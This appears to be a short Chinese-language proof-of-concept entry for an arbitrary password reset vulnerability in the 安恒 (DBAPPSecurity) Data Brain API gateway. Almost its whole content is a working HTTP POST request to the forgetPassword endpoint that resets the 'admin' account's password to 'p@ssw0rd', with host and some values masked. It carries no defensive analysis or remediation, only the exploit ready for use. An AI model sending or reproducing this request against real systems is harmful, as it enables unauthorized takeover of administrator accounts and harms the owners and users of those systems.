# 安恒 数据大脑API网关 任意密码重置漏洞

## POC / EXP

```
# 重置密码为：p@ssw0rd
POST /q/common-permission/public/users/forgetPassword HTTP/1.1
Host: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.5
Content-type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 104

{"code":XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,"rememberMe":false,"use
rname":"admin","password":"XXXXXXXXXXXXXXXXXXXXXXXXXX"}
```